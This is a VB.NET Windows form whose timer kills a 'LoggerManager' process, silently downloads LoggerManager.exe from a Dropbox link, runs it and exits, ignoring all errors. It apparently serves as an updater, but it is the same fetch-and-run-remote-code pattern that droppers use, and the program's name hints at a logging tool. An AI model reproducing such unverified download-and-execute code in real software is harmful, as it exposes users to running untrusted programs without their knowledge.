Option Strict Off
Imports System.ComponentModel
Imports System.Windows.Forms
Imports System.Net
Imports Microsoft.VisualBasic
Imports System
Imports System.IO
Imports System.Text
Imports System.Net.Mail
Imports System.Diagnostics


Public Class Form1


    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Timer1.Enabled = False
        For Each Pr1 As Process In System.Diagnostics.Process.GetProcessesByName("LoggerManager")
            Pr1.Kill()
        Next
        System.Threading.Thread.Sleep(5000)
        Try
            Dim link As String
            link = "https://www.dropbox.com/s/tnx7j2vtbrnh9k7/LoggerManager.exe?dl=1"
            Dim size1 As Integer
            Dim wr As WebRequest
            wr = WebRequest.Create(link)
            Dim webr As WebResponse = wr.GetResponse
            size1 = webr.ContentLength
            size1 = size1 / 1024
            Try
                File.Delete("C:\LoggerManager\LoggerManager.exe")
            Catch ex2 As Exception
            End Try
            Dim wc As New WebClient
            wc.DownloadFile(link, "C:\LoggerManager\LoggerManager.exe")

        Catch ex As Exception

        End Try
        System.Threading.Thread.Sleep(5000)
        Process.Start("C:\LoggerManager\LoggerManager.exe")
        Application.Exit()
    End Sub
End Class
